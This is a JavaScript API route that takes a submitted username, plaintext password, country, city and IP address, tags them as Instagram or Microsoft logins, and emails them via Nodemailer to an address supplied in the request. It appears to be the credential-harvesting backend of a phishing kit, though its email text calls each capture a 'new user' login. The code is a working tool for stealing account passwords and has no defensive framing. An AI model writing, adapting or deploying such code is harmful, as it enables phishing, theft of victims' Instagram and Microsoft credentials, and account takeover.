import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, password, country, city, continent, ip, adminEmail } = req.body;
    
    // Determine platform from username
    let platform = "Login";
    if (username.includes('(IG)')) {
      platform = "Instagram";
    } else if (username.includes('(MS)') || username.includes('(hotmail)')) {
      platform = "Microsoft";
    }
    
    // Configure Nodemailer
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT,
      secure: process.env.SMTP_SECURE === 'true',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });
    
    // Create email content
    const mailOptions = {
      from: `"${platform} Login" <${process.env.SMTP_USER}>`,
      to: adminEmail,
      subject: `New ${platform} Login`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
          <div style="background-color: #4267B2; color: white; padding: 10px 20px; border-radius: 3px 3px 0 0;">
            <h2>New ${platform} Login</h2>
          </div>
          <div style="padding: 20px;">
            <p>A new user has logged in with ${platform} credentials:</p>
            <table style="width: 100%; border-collapse: collapse;">
              <tr>
                <th style="text-align: left; padding: 10px; background-color: #f2f2f2; border-bottom: 1px solid #ddd;">Username:</th>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">${username}</td>
              </tr>
              <tr>
                <th style="text-align: left; padding: 10px; background-color: #f2f2f2; border-bottom: 1px solid #ddd;">Password:</th>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">${password}</td>
              </tr>
              <tr>
                <th style="text-align: left; padding: 10px; background-color: #f2f2f2; border-bottom: 1px solid #ddd;">Country:</th>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">${country}</td>
              </tr>
              <tr>
                <th style="text-align: left; padding: 10px; background-color: #f2f2f2; border-bottom: 1px solid #ddd;">City:</th>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">${city}</td>
              </tr>
              <tr>
                <th style="text-align: left; padding: 10px; background-color: #f2f2f2; border-bottom: 1px solid #ddd;">IP:</th>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">${ip}</td>
              </tr>
              <tr>
                <th style="text-align: left; padding: 10px; background-color: #f2f2f2; border-bottom: 1px solid #ddd;">Time:</th>
                <td style="padding: 10px; border-bottom: 1px solid #ddd;">${new Date().toLocaleString()}</td>
              </tr>
            </table>
          </div>
          <div style="background-color: #f5f5f5; padding: 10px 20px; font-size: 12px; color: #666; border-radius: 0 0 3px 3px;">
            <p>This is an automated email. Please do not reply.</p>
          </div>
        </div>
      `,
    };
    
    // Send email
    await transporter.sendMail(mailOptions);
    
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Email error:', error);
    return res.status(500).json({ error: error.message });
  }
} 